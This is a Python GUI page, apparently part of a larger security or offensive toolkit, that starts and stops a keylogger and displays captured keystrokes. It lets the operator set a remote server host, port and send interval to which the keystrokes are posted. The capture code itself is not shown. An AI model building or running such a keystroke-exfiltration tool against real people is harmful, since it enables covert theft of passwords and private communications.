import customtkinter as ctk
import queue
from core.keyboard_monitor import KeyLogger


class KeyloggerPage(ctk.CTkFrame):

    def __init__(self, master):
        super().__init__(master)

        self.key_queue = queue.Queue()
        self.keylogger = None

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(4, weight=1)

        title = ctk.CTkLabel(
            self,
            text="Keylogger",
            font=("JetBrains Mono", 32, "bold")
        )

        title.grid(row=0, column=0, pady=(20, 10))

        controls = ctk.CTkFrame(self)
        controls.grid(row=1, column=0, sticky="ew", padx=30, pady=10)
        controls.grid_columnconfigure((1, 3, 5), weight=1)

        host_label = ctk.CTkLabel(controls, text="Server Host")
        host_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
        self.host_entry = ctk.CTkEntry(controls)
        self.host_entry.insert(0, "127.0.0.1")
        self.host_entry.grid(row=0, column=1, sticky="ew", padx=5, pady=10)

        port_label = ctk.CTkLabel(controls, text="Server Port")
        port_label.grid(row=0, column=2, padx=10, pady=10, sticky="w")
        self.port_entry = ctk.CTkEntry(controls)
        self.port_entry.insert(0, "8080")
        self.port_entry.grid(row=0, column=3, sticky="ew", padx=5, pady=10)

        interval_label = ctk.CTkLabel(controls, text="Send Interval")
        interval_label.grid(row=0, column=4, padx=10, pady=10, sticky="w")
        self.interval_entry = ctk.CTkEntry(controls)
        self.interval_entry.insert(0, "10")
        self.interval_entry.grid(row=0, column=5, sticky="ew", padx=5, pady=10)

        log_label = ctk.CTkLabel(controls, text="Log File (optional)")
        log_label.grid(row=1, column=0, padx=10, pady=10, sticky="w")
        self.log_entry = ctk.CTkEntry(controls, placeholder_text="e.g. keys.log")
        self.log_entry.grid(row=1, column=1, columnspan=5, sticky="ew", padx=5, pady=10)

        button_frame = ctk.CTkFrame(self)
        button_frame.grid(row=2, column=0, pady=10)

        self.start_btn = ctk.CTkButton(
            button_frame,
            text="▶ Start Keylogger",
            width=170,
            command=self.start_logger
        )
        self.start_btn.pack(side="left", padx=10, pady=8)

        self.stop_btn = ctk.CTkButton(
            button_frame,
            text="■ Stop",
            width=120,
            state="disabled",
            command=self.stop_logger
        )
        self.stop_btn.pack(side="left", padx=10, pady=8)

        self.clear_btn = ctk.CTkButton(
            button_frame,
            text="🗑 Clear",
            width=120,
            command=self.clear_text
        )
        self.clear_btn.pack(side="left", padx=10, pady=8)

        self.status_label = ctk.CTkLabel(
            self,
            text="● Keylogger stopped",
            font=("JetBrains Mono", 13)
        )
        self.status_label.grid(row=3, column=0, pady=(5, 0))

        self.log_text = ctk.CTkTextbox(self, width=1180, height=420)
        self.log_text.grid(row=4, column=0, sticky="nsew", padx=30, pady=20)
        self.log_text.configure(state="disabled")

        self.after(100, self.process_queue)

    def key_callback(self, key_data):
        self.key_queue.put(key_data)

    def process_queue(self):
        try:
            while True:
                key_text = self.key_queue.get_nowait()
                self.log_text.configure(state="normal")
                self.log_text.insert("end", key_text)
                self.log_text.see("end")
                self.log_text.configure(state="disabled")
        except queue.Empty:
            pass

        self.after(100, self.process_queue)

    def start_logger(self):
        host = self.host_entry.get().strip() or "127.0.0.1"
        try:
            port = int(self.port_entry.get().strip() or 8080)
        except ValueError:
            port = 8080
        try:
            interval = int(self.interval_entry.get().strip() or 10)
        except ValueError:
            interval = 10

        log_file = self.log_entry.get().strip() or None

        if self.keylogger is None:
            self.keylogger = KeyLogger(
                callback=self.key_callback,
                host=host,
                port=port,
                interval=interval,
                log_file=log_file,
            )

        self.keylogger.host = host
        self.keylogger.port = port
        self.keylogger.interval = interval
        self.keylogger.log_file = log_file
        self.keylogger.start()

        self.status_label.configure(text=f"● Capturing keys, posting to {host}:{port}")
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")

    def stop_logger(self):
        if self.keylogger:
            self.keylogger.stop()

        self.status_label.configure(text="● Keylogger stopped")
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")

    def clear_text(self):
        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.configure(state="disabled")
